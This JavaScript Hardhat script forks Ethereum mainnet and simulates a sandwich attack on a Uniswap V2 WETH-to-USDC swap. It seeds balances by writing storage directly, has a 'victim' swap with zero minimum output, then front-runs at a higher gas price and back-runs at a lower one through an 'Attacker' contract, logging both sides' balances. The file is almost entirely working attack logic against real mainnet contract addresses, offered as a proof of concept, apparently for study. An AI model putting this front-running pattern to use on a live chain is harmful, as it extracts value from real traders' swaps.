
const { network, ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {

// Fork the mainnet
  await hre.network.provider.request({
    method: "hardhat_reset",
    params: [{
      forking: {
        jsonRpcUrl: "https://rpc.ankr.com/eth"
        ,blockNumber: 17626926      
        }
      }]
    })


  //Set contract address , which can be tracked by etherscan 
  const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const Router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
  const [maliciousUser, victim] = await ethers.getSigners();
  const amount = 1000000000000000000000; // 1_000 ETH

  /////////////////////////////////////////////////////////////////////////
  ////// This Section of code responsible for balance manipulation ////////
  /////////////////////////////////////////////////////////////////////////
  const toBytes32 = (bn) => {
    return ethers.hexlify(ethers.zeroPadValue(ethers.toBeHex(BigInt(bn)), 32));
  };
  const setStorageAt = async (address, index, value) => {
    await ethers.provider.send("hardhat_setStorageAt", [address, index, value]);
  };
  /////////////////////////////////////////////////////////////////////////


  // Deploy the code
  const attacker = await ethers.deployContract("Attacker");
  const maliciousContract = await attacker.getAddress();
  console.log("Malicious contract:", maliciousContract);


  //Manipulate Attacker contract balance to 1_000 WETH
  const AttackerIndex = ethers.solidityPackedKeccak256(["uint256", "uint256"], [maliciousContract, 3]); // key, slot
  await setStorageAt(
    WETH,
    AttackerIndex,
    toBytes32(amount).toString()
  );

  //Manipulate Victim balance to 1_000 WETH
  const VictimIndex = ethers.solidityPackedKeccak256(["uint256", "uint256"], [victim.address, 3]); // key, slot
  await setStorageAt(
    WETH,
    VictimIndex,
    toBytes32(amount).toString()
  );


  // Log the balance of both sides : attacker & victim 
  console.log("attacker contract address = ", ethers.getAddress(maliciousContract));
  const attackerUSDCBalanceBefore = await attacker.getUSDCBalance(maliciousContract);
  const attackerWETHBalanceBefore = await attacker.getWETHBalance(maliciousContract);

  console.log("USDC Balance Before (attacker) = ", BigInt(attackerUSDCBalanceBefore).toString());
  console.log("WETH Balance Before (attacker) = ", BigInt(attackerWETHBalanceBefore).toString());

  const victimUSDCBalanceBefore = await attacker.getUSDCBalance(victim.address);
  const victimWETHBalanceVictim = await attacker.getWETHBalance(victim.address);

  console.log("USDC Balance Before (victim) = ", BigInt(victimUSDCBalanceBefore).toString());
  console.log("WETH Balance Before (victim) = ", BigInt(victimWETHBalanceVictim).toString());
  


  // Victim make an approval transaction, to give approval to router contract
  const approveFunctionName = "approve";
  const IERC20Interface = new ethers.Interface([
    "function approve(address spender, uint256 amount) public"
  ]);
  const approveParams = [
    Router,
    BigInt(amount)
  ]
  await victim.sendTransaction({
    to: WETH,
    data: IERC20Interface.encodeFunctionData(approveFunctionName, approveParams)
  });


  // set the mining behavior to false, so the transaction will be collected in the mempool, before finalization
  await network.provider.send("evm_setAutomine", [false]);

  /////////////////////////////////////////////////////////////////////////
  //////////// Victim made the transaction to swap their WETH /////////////
  /////////////////////////////////////////////////////////////////////////
  const functionName = "swapExactTokensForTokens";
  const block = await ethers.provider.getBlock(17626926);
  const params = [
    BigInt(amount), // amount in
    BigInt(0),      // min amount out
    [
      WETH,         // Asset in
      USDC          // Asset out
    ],
    victim.address, // Receiving address
    block.timestamp + 7200 // Deadline
  ];
  const routerInterface = new ethers.Interface([
    "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) public"
  ]);
  await victim.sendTransaction({
    to: Router,
    data: routerInterface.encodeFunctionData(functionName, params),
    gasLimit: 500000,
    gasPrice: ethers.parseUnits("100", "gwei")
  });
  /////////////////////////////////////////////////////////////////////////

  // Attacker frontrun the transaction, by inflating gasPrice args
  // WETH -> USDC
  await attacker.connect(maliciousUser).firstSwap(BigInt(amount), {gasLimit: 500000, gasPrice: ethers.parseUnits("101", "gwei")} );


  // Attacker backrun the victim transaction, by lowering the gasPrice args
  // USDC -> WETH
  await attacker.connect(maliciousUser).secondSwap( {gasLimit: 500000, gasPrice: ethers.parseUnits("99", "gwei")} );


  // Manually mine the block
  await ethers.provider.send("evm_mine", []); 



  //Log the balance of both sides after the attack
  const attackerUSDCBalanceAfter = await attacker.getUSDCBalance(maliciousContract);
  const attackerWETHBalanceAfter = await attacker.getWETHBalance(maliciousContract);

  console.log("USDC Balance After (attacker) = ", BigInt(attackerUSDCBalanceAfter).toString());
  console.log("WETH Balance After (attacker) = ", BigInt(attackerWETHBalanceAfter).toString());

  const victimUSDCBalanceAfter = await attacker.getUSDCBalance(victim.address);
  const victimWETHBalanceAfter = await attacker.getWETHBalance(victim.address);

  console.log("USDC Balance After (victim) = ", BigInt(victimUSDCBalanceAfter).toString());
  console.log("WETH Balance After (victim) = ", BigInt(victimWETHBalanceAfter).toString());



}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});